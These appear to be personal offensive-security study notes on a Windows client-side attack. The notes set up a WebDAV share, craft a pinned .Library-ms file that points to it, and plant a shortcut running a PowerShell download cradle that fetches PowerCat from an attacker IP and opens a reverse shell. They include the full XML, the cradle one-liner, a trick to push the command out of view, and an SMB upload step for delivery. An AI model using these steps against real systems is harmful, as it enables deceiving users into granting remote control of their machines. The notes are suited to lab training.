# Attacks
- Library file
	- .Library-ms
- WebDAV
	- windows web server protocol
	- less likely filtered in emails
	- appears as a local directory
- WsgiDAV
	- WebDAV server

1. Download
	- pip3 install wsgidav
		- will install in /home/kali/.local/bin
	- apt-install python3-wsgidav
2. mkdir /home/kali/webdav
3. touch /home/kali/webdav/test.txt
4. wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
	- root = WebDAV share
5. RDP into target
	- xfreerdp
	- xfreerdp /u:username /p:password /v:192.168.0.101
1. Create library file on tgt machine
	1. config.Library-ms
	2. change icon to less suspicious
	3. create XML parameters
		1. Library Description tag
			1. ```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

</libraryDescription>
2. Name Tag
	- cannot be arbitrary
	- provided by DLL name & index
	- @shell32.dll,-34575_ or @windows.storage.dll,-34582_
3. Version Tag
	- ```
<version>6</version>
``
	- number doesnt matter
4. isLibraryPinned tag
	- specifies if the library is pinned to the navigation page on Windows
	- small detail that helps convince target
	- set to true
5. iconReference Tag
	- what icon is displayed
	- imagesres.dll
		- chooses between all windows icons
		- "-1002" for Documents folder icon
		- "-1003" for Pictures folder icon
	- ```
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>
	``
	- templateInfo tags
		- contains folderType tags
			- determines the columns & details by default when opening the library
		- specify GUID
			- to look up on Microsoft documentation webpage
			- using Documents GUID
			- ```
	<templateInfo>
	<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	``
- searchConnectDescriptionList Tag
	- specify the storage location where our library file points to
	- contains a list of search connectors
		- defined by searchConnectorDescription
	- add isDefaultSaveLocation tag
		- set to true
	- isSupported tag
		- set to true
		[	- URL tag]
			- point to our created WebDAV share 
			- contains simpleLocation Tag
				- user friendly more so than locationProvider element
			- ```
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
``
- Entire XML of library file
	- ```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
``

- Serialized tag
	- windows bae64 encodes URL automatically
	- can result in fails
	- must re-insert XML property data to refresh each time
6. Create shortcut on windows desktop
	- Have it point to Powershell
	- Use download cradle to load PowerCat from our Kali to start reverse shell
	- ```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.145.245:8000/powercat.ps1');
powercat -c 192.168.45.245 -p 4444 -e powershell"
``
	- to hide command in shortcut, use delimeter or benign command to push the reverse shell command out of view
	- WebDAV is writeable
	- mostly likely blocked by AV
	- use python 3 web server to transfer powercat file
- Example 2:
	- cd webdav
	- rm test.txt
	- smbclient //192.168.50.195/share -c 'put config.Library-ms'

#webdav #revshell #shells #powercat #powershell
